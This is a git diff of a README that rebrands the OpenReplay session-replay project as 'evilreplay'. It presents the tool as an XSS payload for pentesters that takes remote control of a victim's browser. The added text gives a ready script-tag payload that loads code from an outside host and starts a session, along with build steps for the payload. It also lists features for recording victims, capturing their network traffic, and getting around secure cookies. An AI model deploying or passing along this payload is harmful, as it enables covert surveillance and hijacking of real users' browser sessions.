@@ -1,24 +1,10 @@
 <p align="center">
-  <a href="/README_FR.md">Français</a>
-  &nbsp;|&nbsp;
-  <a href="/README_ESP.md">Español</a>
-  &nbsp;|&nbsp;
-  <a href="/README_RU.md">Русский</a>
-  &nbsp;|&nbsp;
-  <a href="/README_AR.md">العربية</a>
-</p>
-
-<p align="center">
-  <a href="https://openreplay.com/#gh-light-mode-only">
-    <img src="static/openreplay-git-banner-light.png" width="100%">
-  </a>
-    <a href="https://openreplay.com/#gh-dark-mode-only">
-    <img src="static/openreplay-git-banner-dark.png" width="100%">
+  <a href="https://github.com/EgeBalci/evilreplay">
+    <img src="https://github.com/EgeBalci/evilreplay/raw/master/.github/img/banner.png">
   </a>
 </p>
 
-<h3 align="center">Session replay for developers</h3>
-<p align="center">The most advanced session replay for building delightful web apps.</p>
+<h3 align="center">Seamless remote browser session control for pentesters</h3>
 
 <p align="center">
   <a href="https://docs.openreplay.com/deployment/deploy-aws">
@@ -38,31 +24,53 @@
   </a>
 </p>
 
-<p align="center">
-  <a href="https://github.com/openreplay/openreplay">
-    <img src="static/openreplay-git-hero.svg">
-  </a>
-</p>
 
-OpenReplay is an open-source session replay suite you can host yourself, that lets you see what users do on your web app, helping you troubleshoot issues faster.
+This tool is a weaponized adaptation of the [OpenReplay project](https://github.com/openreplay/openreplay), tailored for penetration testers and security professionals to demonstrate and assess the impact of Cross-Site Scripting (XSS) vulnerabilities in restricted environmets without the need for stealing cookies.
 
-- **Session replay.** OpenReplay replays what users do, but not only. It also shows you what went under the hood, how your website or app behaves by capturing network activity, console logs, JS errors, store actions/state, page speed metrics, cpu/memory usage and much more.
-- **Low footprint**. With a ~26KB (.br) tracker that asynchronously sends minimal data for a very limited impact on performance.
-- **Self-hosted**. No more security compliance checks, 3rd-parties processing user data. Everything OpenReplay captures stays in your cloud for a complete control over your data.
-- **Privacy controls**. Fine-grained security features for sanitizing user data.
-- **Easy deploy**. With support of major public cloud providers (AWS, GCP, Azure, DigitalOcean).
+https://github.com/user-attachments/assets/ef0f4018-db54-47b4-8513-90ae7a244e3a
 
-## Features
+### 🔥 Key Features
 
-- **Session replay:** Lets you relive your users' experience, see where they struggle and how it affects their behavior. Each session replay is automatically analyzed based on heuristics, for easy triage.
-- **Spot:** A Chrome extension that lets record bugs directly from your browser — each recording includes all the technical details developers need to fix them.
-- **DevTools:** It's like debugging in your own browser. OpenReplay provides you with the full context (network activity, JS errors, store actions/state and 40+ metrics) so you can instantly reproduce bugs and understand performance issues.
-- **Assist:** Helps you support your users by seeing their live screen and instantly hopping on call (WebRTC) with them without requiring any 3rd-party screen sharing software.
-- **Omni-search:** Search and filter by almost any user action/criteria, session attribute or technical event, so you can answer any question. No instrumentation required.
-- **Analytics:** For surfacing the most impactful issues causing conversion and revenue loss.
-- **Fine-grained privacy controls:** Choose what to capture, what to obscure or what to ignore so user data doesn't even reach your servers.
-- **Plugins oriented:** Get to the root cause even faster by tracking application state (Redux, VueX, MobX, NgRx, Pinia and Zustand) and logging GraphQL queries (Apollo, Relay) and Fetch/Axios requests.
-- **Integrations:** Sync your backend logs with your session replays and see what happened front-to-back. OpenReplay supports Sentry, Datadog, CloudWatch, Stackdriver, Elastic and more.
+* 🎯 **Remote Browser Control**
+  Interact with the victim’s browser in real time via an intuitive UI — click buttons, follow links, and simulate keystrokes remotely.
+
+* 📹 **Automatic Session Recording**
+  All victim interactions are recorded, providing replayable sessions for easier analysis and reporting of XSS findings.
+
+* 🔍 **Deep Visibility**
+  Access detailed browser diagnostics:
+
+  * Console logs & JS errors
+  * Network requests and responses
+  * Application state and store actions
+  * 40+ performance and behavior metrics
+
+* 🛡️ **Bypasses Secure Contexts**
+  Capture data even when secure cookies and modern browser protections are in place.
+
+## Usage
+
+The following script can be used as a XSS payload. **(don't forget to change the `projectKey`)** Follow the [Building The Payload](#Building-The-Payload) section for compiling the payload from the source. (The `ingestPoint` parameter needs to be updated when self-hosting)
+
+
+```html
+<script src="https://ege.sh/drop/sc.js" onload=evilreplay("OEeP7C6ysFPXP8mDI04T")></script>
+```
+
+## Building The Payload
+
+For building the `evilreplay.js` XSS payload from the souce you need to install [bun](https://bun.sh/) follow the steps below.
+
+```
+git clone https://github.com/EgeBalci/evilreplay
+cd ./evilreplay/tracker/tracker-assist
+bun install 
+bun run build 
+cd ../tracker 
+bun run build 
+
+# XSS payload is built as dist/iife/evilreplay.js
+```
 
 ## Deployment Options
 
@@ -76,28 +84,4 @@ OpenReplay can be deployed anywhere. Follow our step-by-step guides for deployin
 - [OVHcloud](https://docs.openreplay.com/deployment/deploy-ovhcloud)
 - [Kubernetes](https://docs.openreplay.com/deployment/deploy-kubernetes)
 
-## OpenReplay Cloud
 
-For those who want to simply use OpenReplay as a service, [sign up](https://app.openreplay.com/signup) for a free account on our cloud offering.
-
-## Community Support
-
-Please refer to the [official OpenReplay documentation](https://docs.openreplay.com/). That should help you troubleshoot common issues. For additional help, you can reach out to us on one of these channels:
-
-- [Slack](https://slack.openreplay.com) (Connect with our engineers and community)
-- [GitHub](https://github.com/openreplay/openreplay/issues) (Bug and issue reports)
-- [Twitter](https://twitter.com/OpenReplayHQ) (Product updates, Great content)
-- [YouTube](https://www.youtube.com/channel/UCcnWlW-5wEuuPAwjTR1Ydxw) (How-to tutorials, past Community Calls)
-- [Website chat](https://openreplay.com) (Talk to us)
-
-## Contributing
-
-We're always on the lookout for contributions to OpenReplay, and we're glad you're considering it! Not sure where to start? Look for open issues, preferably those marked as good first issues.
-
-See our [Contributing Guide](CONTRIBUTING.md) for more details.
-
-Also, feel free to join our [Slack](https://slack.openreplay.com) to ask questions, discuss ideas or connect with our  contributors.
-
-## License
-
-This monorepo uses several licenses. See [LICENSE](/LICENSE) for more details.
